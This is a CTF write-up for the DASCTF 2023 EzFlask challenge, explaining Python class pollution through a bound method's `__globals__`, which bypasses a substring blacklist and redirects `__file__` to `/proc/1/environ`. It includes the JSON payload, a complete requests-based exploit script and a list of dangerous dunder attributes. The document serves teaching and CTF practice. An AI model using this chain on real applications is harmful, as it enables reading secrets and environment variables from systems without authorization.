# DASCTF 2023 EzFlask — Python Class Pollution via `__globals__`

> **Flag**: `flag{...}` (organiser-rotated)
>
> Python's equivalent of JavaScript prototype pollution. A custom recursive `merge` function copies user JSON into an application object without filtering attribute names. The CTF's twist is that the obvious targets (`__init__`, `__class__`) are blacklisted on the raw request body — but `__globals__`, which lives on every bound method, is not. Walking through a method's `__globals__` you reach the module-level `__file__` variable, which a downstream route then `open()`s and renders. Point it at `/proc/1/environ`, get the flag from container env vars.

## 0. App overview

| Field | Value |
|---|---|
| Runtime | Python 3.10.1, Flask (debug mode enabled) |
| Auth | Session-based, recursive merge from JSON into `User` instance |
| Vulnerable pattern | `merge(request.json, user_instance)` |
| Blacklist | `__init__` and `__class__` substring-matched against `request.data` (raw bytes) |
| Render sink | Index route does `open(__file__).read()` and sends it back |

The bug is structurally identical to the Node.js / `lodash.merge` family of prototype pollutions — recursive copy with no `__proto__`-equivalent guard.

## 1. The vulnerable merge

The decompiled / source-leaked merge function looks roughly like:

```python
def merge(src, dst):
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):       # dict-like dst
            if dst.get(k) and isinstance(v, dict):
                merge(v, dst.get(k))
            else:
                dst[k] = v
        else:                                  # object dst
            if hasattr(dst, k) and isinstance(v, dict):
                merge(v, getattr(dst, k))
            else:
                setattr(dst, k, v)
```

Two characteristics matter:

1. **No filtering of keys** — any attribute name from the JSON ends up via `setattr` or `dst[k] = v`.
2. **Recurses through existing attributes** — if `dst.check` exists, sending `{"check": {...}}` recurses into `dst.check`, doing further `setattr` calls on the bound-method object's accessible attributes.

That second point is the leverage. A bound method like `user_instance.check` is a Python object with `.__func__`, `.__self__`, **and `.__globals__`** (inherited from `__func__`).

## 2. The blacklist (and how it misses)

```python
@app.before_request
def blacklist():
    if b'__init__' in request.data or b'__class__' in request.data:
        abort(403)
```

The filter is substring match on the raw request body bytes. It catches the two most-cited Python sandbox-escape attribute names. But **the universe of dangerous dunder attributes is much bigger**:

- `__globals__` (on functions / methods) — module-level globals dict
- `__builtins__` — built-in namespace
- `__subclasses__` (on classes) — class-tree walking, the classic SSTI gadget
- `__loader__`, `__spec__`, `__import__` — module machinery
- `__dict__` — instance attribute dict

For class pollution specifically, **`__globals__` on any user-defined function or method is the workhorse**. Every bound method object on the `User` instance is a free entry point to the module's globals.

## 3. Reading the render sink

The Flask index route:

```python
@app.route('/')
def index():
    return open(__file__).read()
```

`__file__` in this context is a *module-level global*, normally `/app/app.py`. The route renders that file's contents as the HTTP response.

If we can change `__file__` to point at `/proc/1/environ`, the index route happily reads PID 1's environment variables and returns them. In Docker containers, the flag is frequently exposed as an environment variable for PID 1 (the entrypoint process).

## 4. The pollution chain

We want: `app_module.__dict__['__file__'] = '/proc/1/environ'`

Path from the merge entry point to that global:

```
user_instance
  └─ .check                         # bound method (user-defined function on User)
       └─ .__globals__              # function's module globals dict
            └─ ['__file__']         # the module-level variable to overwrite
```

`merge({"check": {"__globals__": {"__file__": "/proc/1/environ"}}}, user_instance)`:

1. Iterates `{"check": ...}` against `user_instance`. `user_instance.check` exists. Value is a dict, recurse with `merge(check_dict, user_instance.check)`.
2. Iterates `{"__globals__": ...}` against the bound method. The method has `__globals__`. Value is a dict, recurse.
3. Iterates `{"__file__": "/proc/1/environ"}` against the globals dict. Globals dict has `__getitem__`, so the leaf assignment runs `globals_dict["__file__"] = "/proc/1/environ"`.

Three levels of recursion, no blacklisted attribute names touched.

## 5. Payload

```json
{
  "username": "x",
  "password": "x",
  "check": {
    "__globals__": {
      "__file__": "/proc/1/environ"
    }
  }
}
```

Send to the registration / login endpoint that triggers `merge`. Then GET `/` to read the modified `__file__`.

## 6. Full exploit

```python
import requests

URL = "http://<host>"
s = requests.Session()

# 1) Pollute __file__ via merge
payload = {
    "username": "x",
    "password": "x",
    "check": {
        "__globals__": {
            "__file__": "/proc/1/environ"
        }
    }
}
s.post(f"{URL}/register", json=payload)

# 2) Read modified __file__ via index route
r = s.get(f"{URL}/")
print(r.text)
# Parse FLAG=... line from the environ dump
```

## 7. Traps and lessons learned

| Trap | Why it cost me time | Resolution |
|---|---|---|
| Tried `__class__.__init__.__globals__` first | Habit from Jinja2 SSTI templates | Both `__class__` and `__init__` were blacklisted. Direct access via `check.__globals__` skips both |
| Sent payload as form data | `application/x-www-form-urlencoded` doesn't trigger Flask's JSON parser | Set `json=` (or `Content-Type: application/json`). The merge function only runs on parsed JSON |
| Targeted `__builtins__` initially | Wanted to redefine `open()` or `print()` for RCE | Reading `/proc/1/environ` is simpler — the route already calls `open(__file__)`. Don't over-engineer |
| `/proc/self/environ` returned empty | The Flask process is not PID 1 in this container | PID 1 is the Docker entrypoint that has the FLAG env var. Use `/proc/1/environ` specifically |
| Confused module path | The leaked `__file__` showed `/app/app.py` but app was running from `/usr/src/app/` | `__file__` is whatever the import system recorded; trust the value you read, don't guess |

## 8. Methodology takeaways

1. **Python class pollution is real — same shape as JS prototype pollution.** Look for recursive merges, `setattr` loops, JSON-to-object converters. The standard targets shift from `Object.prototype` to `__globals__`, `__builtins__`, `__class__`, but the bug pattern is identical.
2. **`__globals__` is the under-publicised gadget.** Every user-defined function (including bound methods on instances) has it. Blacklists that only block `__init__` / `__class__` miss the most useful entry point.
3. **Blacklist on raw body bytes is the weakest filter form.** It can't see Unicode escapes, JSON-decoded key transformations, or alternative spellings. If you find a substring blacklist, enumerate all dunders that route to the same effect.
4. **`/proc/1/environ` reads PID 1's env vars** — the Docker entrypoint. In CTF containers this is where `FLAG=...` typically lives. Always try this when arbitrary file read lands in your lap.
5. **Render sinks are gold.** If any route does `open(some_variable).read()`, that variable's value is a write target for any primitive you have (env var, template variable, module global). Class pollution + reflected file read = clean flag exfil.

## 9. Related techniques

- [GYCTF 2020 Ez_Express](gyctf2020_ez_express.md) — the Node.js cousin of this bug; same merge shape, JS proto chain instead
- [`__globals__` chain references](https://docs.python.org/3/reference/datamodel.html) — Python language reference, `function.__globals__` description
